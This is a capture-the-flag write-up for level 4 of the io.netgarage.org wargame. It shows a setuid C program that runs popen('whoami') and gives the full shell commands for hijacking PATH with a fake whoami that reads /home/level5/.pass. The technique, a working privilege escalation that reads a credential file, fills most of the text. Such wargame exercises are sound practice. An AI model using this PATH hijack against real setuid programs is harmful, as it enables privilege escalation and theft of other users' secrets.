# io.netgarage.org: level4
Login to the challenge server, run the binary, you know the drill:
```
level4@io:/levels$ ./level04
Welcome level5
level4@io:/levels$
```
Let's take a look at the source:
```C
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```
The program simply runs `whoami`, gets the result, and print's "Welcome 
<username>". Because it says "Welcome level5", we know this is a setuid 
program.
This vulnerability is simple: we can edit the `PATH` environment variable 
to add our own `whoami` command that prints the pass rather than the current
user:
```
level4@io:/levels$ mkdir /tmp/msimwashere
level4@io:/levels$ echo "cat /home/level5/.pass" > /tmp/msimwashere/whoami
level4@io:/levels$ chmod +x /tmp/msimwashere/whoami
level4@io:/levels$ export PATH=/tmp/msimwashere:$PATH
```

Now our own `whoami` is at the start of the `PATH` environment variable, 
meaning it will be called instead of the real `whoami`:

```
level4@io:/levels$ ./level04
Welcome <REDACTED>
```

And we now have the pass from `/home/level5/.pass`:
And so, level04 is solved.

Happy Hacking!

~MarcoSi